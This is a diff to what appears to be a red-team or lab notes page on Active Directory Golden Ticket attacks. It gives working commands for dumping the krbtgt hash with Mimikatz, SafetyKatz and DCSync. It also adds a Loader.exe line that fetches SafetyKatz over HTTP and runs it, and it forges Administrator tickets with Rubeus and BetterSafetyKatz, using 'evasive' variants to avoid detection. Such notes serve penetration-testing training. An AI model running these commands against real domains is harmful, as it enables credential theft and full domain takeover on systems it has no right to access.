@@ -11,10 +11,12 @@ There are multiple ways to get the krbtgt account hash
 ```powershell
 # Execute on DC as Domain Admin
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+# With SafetyKatz
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
 
 # DCSync to get AES keys
 # Needs Domain admin or Replication Rights
-C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 
 Use `klist` on any machine to check tickets available and `klist purge` to remove all of them. Use these from **Rubeus** module for OPsec safe.
@@ -23,8 +25,8 @@ Use `klist` on any machine to check tickets available and `klist purge` to remov
 
 {% code overflow="wrap" %}
 ```powershell
-# Forge a Golden Ticket with attributes similar to normal TGT
-Rubeus.exe golden /aes256:<krbtgt_token> /sid:<sid_of_current_domain> /ldap /user:Administrator /printcmd
+# Forge a Golden Ticket with attributes similar to normal TGT. Run in a new cmd
+Rubeus.exe evasive-golden /aes256:<krbtgt_token> /sid:<sid_of_current_domain> /ldap /user:Administrator /printcmd
 
 # Another way
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<user_sid> /aes256:<aes_key> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
